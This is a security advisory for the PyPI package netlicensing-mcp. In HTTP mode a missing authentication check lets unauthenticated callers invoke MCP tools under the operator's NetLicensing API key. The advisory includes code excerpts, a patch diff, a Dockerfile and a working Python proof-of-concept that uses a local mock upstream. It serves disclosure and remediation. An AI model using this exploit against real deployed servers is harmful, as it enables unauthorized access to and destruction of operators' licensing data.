# [H] NetLicensing-MCP: Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode

## Summary
Severity: High
Advisory: GHSA-x9vc-9ffq-p3gj
CVE: CVE-2026-54446
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-x9vc-9ffq-p3gj
Type: github-advisory

## Affected
- PyPI: `netlicensing-mcp` — affected >=0 <0.1.6

## Details
## Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode

### Summary

When `netlicensing-mcp` is run in HTTP transport mode, the `ApiKeyMiddleware` fails to enforce authentication: requests that carry no client API key are unconditionally forwarded to the next handler (`server.py:1427`). The downstream HTTP client then falls back to the server operator's `NETLICENSING_API_KEY` environment variable (`client.py:30`) and uses it to authenticate every upstream call to the NetLicensing REST API. An unauthenticated network attacker can therefore invoke any MCP tool — including product listing, license creation/modification, and destructive delete operations — entirely under the operator's identity and account quota. CVSS 3.1 Base Score: **8.1 (High)**.

### Details

The HTTP transport is started in `src/netlicensing_mcp/server.py` around line 1430 via `mcp.streamable_http_app()`, and `ApiKeyMiddleware` is registered immediately after (line 1431). The middleware implementation (lines 1412–1427) attempts to extract a per-request API key from either the `x-netlicensing-api-key` header or the `?apikey=` query parameter. However, if neither source provides a key, the middleware takes no enforcement action and simply calls `return await call_next(request)` (line 1427), passing the unauthenticated request downstream.

The downstream client module (`src/netlicensing_mcp/client.py`) uses a Python `ContextVar` named `api_key_ctx` with a default of `os.getenv("NETLICENSING_API_KEY", "")` (line 30). Because the middleware never sets this context variable for unauthenticated requests, `api_key_ctx.get()` returns the server-level environment variable. The client then encodes this value into an HTTP Basic Authorization header (`lines 62–70`) and transmits it to the upstream NetLicensing REST API on every request (`lines 105, 109`).

The complete exploitable data flow is:

| Step | Location | Description |
|------|----------|-------------|
| 1 | `server.py:1430` | HTTP app created with `mcp.streamable_http_app()` |
| 2 | `server.py:1431` | `ApiKeyMiddleware` registered |
| 3 | `server.py:1412–1419` | Middleware attempts (optional) key extraction from headers/query |
| 4 | `server.py:1427` | **Auth bypass sink**: missing key → `return await call_next(request)` |
| 5 | `server.py:155–163` | Unauthenticated caller invokes `netlicensing_list_products` (or any tool) |
| 6 | `tools/products.py:9,17` | Tool delegates to `nl_get("/product", ...)` |
| 7 | `client.py:30` | **Source**: `api_key_ctx` defaults to `NETLICENSING_API_KEY` env var |
| 8 | `client.py:62–70` | `Authorization: Basic base64("apiKey:<key>")` constructed |
| 9 | `client.py:105,109` | **Upstream sink**: `client.get(url, headers=_headers(), ...)` executed |

Critical code excerpts:

```python
# src/netlicensing_mcp/server.py
1418:     if not key:
1419:         key = request.query_params.get("apikey")
1421:     if key:
1422:         token = api_key_ctx.set(key)
            ...
1427:     return await call_next(request)   # <-- no rejection when key is absent
```

```python
# src/netlicensing_mcp/client.py
30:  "api_key", default=os.getenv("NETLICENSING_API_KEY", "")   # server-side fallback
...
64:  auth_str = f"apiKey:{api_key}"
70:  "Authorization": f"Basic {token}",
...
109: r = await client.get(url, headers=_headers(), params=params or {})
```

The README (`README.md:90–94`) documents the HTTP mode deployment pattern with `-e NETLICENSING_API_KEY=your_key` as a first-class production deployment option, including AWS App Runner / ELB examples (`README.md:310–318`). The per-client key recommendation (`README.md:318`) is advisory only and is not technically enforced.

A suggested patch replaces the unconditional pass-through with a `401` rejection:

```diff
--- a/src/netlicensing_mcp/server.py
+++ b/src/netlicensing_mcp/server.py
@@
          class ApiKeyMiddleware(BaseHTTPMiddleware):
              async def dispatch(self, request: Request, call_next):
+                 if request.url.path == "/health":
+                     return await call_next(request)
+
                  key = request.headers.get("x-netlicensing-api-key")
                  if not key:
                      auth = request.headers.get("authorization")
                      if auth and auth.lower().startswith("bearer "):
                          key = auth[7:]
@@
                          return await call_next(request)
                      finally:
                          api_key_ctx.reset(token)
-                 return await call_next(request)
+                 return JSONResponse(
+                     {"error": "NetLicensing API key is required for HTTP transport"},
+                     status_code=401,
+                 )
```

### PoC

**Environment requirements:**
- Docker (or Python 3.12 with `netlicensing-mcp==0.1.5` and `mcp` client installed)
- Target commit: `ef0080c2aebbf4dfbce93a959dd7c1471103c05a`

**Self-contained Docker reproduction (all-in-one):**

```
# Build the image from the repository root
docker build -f vuln-001/Dockerfile -t vuln-001-netlicensing .

# Run the PoC — exits 0 on confirmed exploit
docker run --rm --network=host vuln-001-netlicensing
```

**Manual step-by-step reproduction:**

```
# Terminal 1 — mock upstream NetLicensing REST API
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("MOCK_REQUEST", self.command, self.path,
              self.headers.get("Authorization"), flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"items": {"item": []}}).encode())
    def log_message(self, *args): pass
HTTPServer(("127.0.0.1", 19090), H).serve_forever()
PY

# Terminal 2 — vulnerable MCP server in HTTP mode with a server-side API key
NETLICENSING_API_KEY=SERVERSECRET \
NETLICENSING_BASE_URL=http://127.0.0.1:19090/core/v2/rest \
MCP_HOST=127.0.0.1 MCP_PORT=18181 PYTHONPATH=src \
python3 -m netlicensing_mcp.server http

# Terminal 3 — attacker: connect with NO API key and invoke a tool
python3 - <<'PY'
import asyncio
from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

async def main():
    async with streamablehttp_client("http://127.0.0.1:18181/mcp") as (read, write, _):
        async with ClientSession(read, write) as session:
            await session.initialize()
            print(await session.call_tool("netlicensing_list_products", {"filter": ""}))

asyncio.run(main())
PY
```

**Expected output in Terminal 1:**

```
MOCK_REQUEST GET /core/v2/rest/product Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
```

Decoding the Base64 credential confirms the operator's secret was used:

```
$ echo YXBpS2V5OlNFUlZFUlNFQ1JFVA== | base64 -d
apiKey:SERVERSECRET
```

**Observed evidence from dynamic reproduction (Phase 2):**

```
[MOCK_UPSTREAM] GET /core/v2/rest/product  Authorization=Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
Decoded: apiKey:SERVERSECRET
[EXPLOIT CONFIRMED] Unauthenticated MCP client caused the server to forward its own
NETLICENSING_API_KEY='SERVERSECRET' to the upstream NetLicensing API.
CWE-306 / VULN-001 reproduced.
```

### Impact

This is a **Missing Authentication for Critical Function (CWE-306)** vulnerability. Any network-reachable attacker who can send HTTP requests to the `/mcp` endpoint can invoke the full set of MCP tools — including read, create, update, and delete operations — without supplying any credential. The attacker's requests are transparently executed under the server operator's NetLicensing account.

Concrete consequences include:

- **Confidentiality**: enumeration of all products, licenses, licensees, and transactions associated with the operator's account.
- **Integrity**: creation of new licenses or licensees, modification of existing license parameters, and forging token-based validations.
- **Availability**: bulk deletion of products, licenses, or licensees, destroying the operator's licensing configuration.

**Who is impacted**: Operators who deploy `netlicensing-mcp` in HTTP transport mode (`python3 -m netlicensing_mcp.server http`) with `NETLICENSING_API_KEY` set as a server-side environment variable and expose the service on a network-reachable interface. This deployment pattern is officially documented in the project README for remote/shared and cloud deployments.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

RUN apt-get update && apt-get install -y --no-install-recommends git \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy repo (with .git for hatch-vcs versioning) and PoC script
COPY repo/ /app/repo/
COPY vuln-001/poc.py /app/poc.py

# Install the vulnerable MCP server package and its dependencies
RUN cd /app/repo && pip install --no-cache-dir .

CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Unauthenticated Use of Server-Side NetLicensing API Key in HTTP Mode
CWE-306 — Missing Authentication for Critical Function

Attack scenario:
 1. Operator runs MCP server in HTTP mode with NETLICENSING_API_KEY set server-side.
 2. Attacker connects to /mcp endpoint supplying NO API key whatsoever.
 3. ApiKeyMiddleware (server.py:1427) passes the request through unconditionally.
 4. Downstream client.py:30 falls back to the server-env NETLICENSING_API_KEY.
 5. The upstream NetLicensing REST API receives the operator's credential — attacker
 effectively uses the operator's account for all MCP tool invocations.

Expected evidence: mock upstream prints
 Authorization: Basic YXBpS2V5OlNFUlZFUlNFQ1JFVA==
 Decoded: apiKey:SERVERSECRET
even though the MCP client sent no credentials.
"""

import asyncio
import base64
import json
import os
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# ─── Configuration ────────────────────────────────────────────────────────────

MOCK_PORT = 19090
MCP_PORT = 18181
SERVER_API_KEY = "SERVERSECRET" # simulated operator secret injected via env var

# ─── Mock upstream NetLicensing REST API ─────────────────────────────────────

captured_requests: list[dict] = []
mock_ready = threading.Event()


class MockUpstreamHandler(BaseHTTPRequestHandler):
 def _handle(self):
 auth = self.headers.get("Authorization", "<none>")
 entry = {
 "method": self.command,
 "path": self.path,
 "authorization": auth,
 }
 captured_requests.append(entry)
 print(
 f"[MOCK_UPSTREAM] {self.command} {self.path} "
 f"Authorization={auth}",
 flush=True,
 )
 self.send_response(200)
 self.send_header("Content-Type", "application/json")
 self.end_headers()
 self.wfile.write(json.dumps({"items": {"item": []}}).encode())

 do_GET = _handle
 do_POST = _handle
 do_PUT = _handle

 def log_message(self, *args):
 pass


def _run_mock(port: int) -> None:
 srv = HTTPServer(("127.0.0.1", port), MockUpstreamHandler)
 mock_ready.set()
 srv.serve_forever()


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _decode_basic(header: str) -> str | None:
 if not header.startswith("Basic "):
 return None
 try:
 return base64.b64decode(header[6:]).decode()
 except Exception:
 return None


async def _wait_for_mcp(host: str, port: int, timeout: float = 15.0) -> bool:
 """Poll until the MCP /health endpoint responds or timeout."""
 import httpx
 deadline = time.monotonic() + timeout
 while time.monotonic() < deadline:
 try:
 async with httpx.AsyncClient() as c:
 r = await c.get(f"http://{host}:{port}/health", timeout=1)
 if r.status_code < 500:
 return True
 except Exception:
 pass
 await asyncio.sleep(0.4)
 return False


# ─── PoC ──────────────────────────────────────────────────────────────────────

async def main() -> None:
 # 1. Start mock upstream
 t = threading.Thread(target=_run_mock, args=(MOCK_PORT,), daemon=True)
 t.start()
 mock_ready.wait(timeout=5)
 print(f"[*] Mock upstream listening on 127.0.0.1:{MOCK_PORT}", flush=True)

 # 2. Launch vulnerable MCP server in HTTP mode with server-side API key
 env = os.environ.copy()
 env.update({
 "NETLICENSING_API_KEY": SERVER_API_KEY,
 "NETLICENSING_BASE_URL": f"http://127.0.0.1:{MOCK_PORT}/core/v2/rest",
 "MCP_HOST": "127.0.0.1",
 "MCP_PORT": str(MCP_PORT),
 })
 proc = subprocess.Popen(
 [sys.executable, "-m", "netlicensing_mcp.server", "http"],
 env=env,
 cwd="/app/repo",
 stdout=subprocess.PIPE,
 stderr=subprocess.PIPE,
 )
 print(f"[*] Vulnerable MCP server started (pid={proc.pid})", flush=True)

 ready = await _wait_for_mcp("127.0.0.1", MCP_PORT, timeout=15)
 if not ready:
 # /health may not exist; just wait a fixed time
 print("[*] /health not responding — waiting 5 s anyway ...", flush=True)
 await asyncio.sleep(5)

 if proc.poll() is not None:
 _, err = proc.communicate()
 print(f"[!] MCP server exited unexpectedly:\n{err.decode()}", flush=True)
 sys.exit(1)

 print(f"[*] MCP server ready on 127.0.0.1:{MCP_PORT}", flush=True)

 # 3. Attack: connect WITHOUT any API key and invoke a tool
 print(
 "\n[ATTACK] Sending MCP tool call to netlicensing_list_products "
 "with NO client API key ...",
 flush=True,
 )
 try:
 from mcp import ClientSession
 from mcp.client.streamable_http import streamablehttp_client

 async with streamablehttp_client(
 f"http://127.0.0.1:{MCP_PORT}/mcp"
 ) as (read, write, _):
 async with ClientSession(read, write) as session:
 await session.initialize()
 result = await session.call_tool(
 "netlicensing_list_products", {"filter": ""}
 )
 print(f"[*] Tool call succeeded: {result}", flush=True)
 except Exception as exc:
 print(f"[*] MCP client exception (may be normal upstream error): {exc}", flush=True)
 finally:
 proc.terminate()
 await asyncio.sleep(0.5)

 # 4. Evaluate captured evidence
 print("\n" + "=" * 70, flush=True)
 print("CAPTURED UPSTREAM REQUESTS:", flush=True)
 for req in captured_requests:
 print(f" {req['method']} {req['path']}", flush=True)
 print(f" Authorization: {req['authorization']}", flush=True)
 decoded = _decode_basic(req["authorization"])
 if decoded:
 print(f" Decoded: {decoded}", flush=True)
 print("=" * 70, flush=True)

 # 5. Verdict
 server_key_leaked = any(
 SERVER_API_KEY in (_decode_basic(r["authorization"]) or "")
 for r in captured_requests
 )

 if server_key_leaked:
 print(
 f"\n[EXPLOIT CONFIRMED] Unauthenticated MCP client caused the server to "
 f"forward its own NETLICENSING_API_KEY='{SERVER_API_KEY}' to the upstream "
 f"NetLicensing API. CWE-306 / VULN-001 reproduced.",
 flush=True,
 )
 sys.exit(0)
 elif not captured_requests:
 print(
 "\n[FAIL] No upstream requests captured — the MCP tool call did not "
 "reach the upstream API.",
 flush=True,
 )
 sys.exit(2)
 else:
 print(
 "\n[FAIL] Upstream requests captured but server API key not found in "
 "Authorization headers.",
 flush=True,
 )
 sys.exit(2)


if __name__ == "__main__":
 asyncio.run(main())
```

## References
- https://github.com/Labs64/NetLicensing-MCP/security/advisories/GHSA-x9vc-9ffq-p3gj
- https://github.com/Labs64/NetLicensing-MCP/commit/fbbb1d5ff88eb5400ec933a84e75601ebee48927
- https://github.com/Labs64/NetLicensing-MCP
- https://github.com/Labs64/NetLicensing-MCP/releases/tag/0.1.6
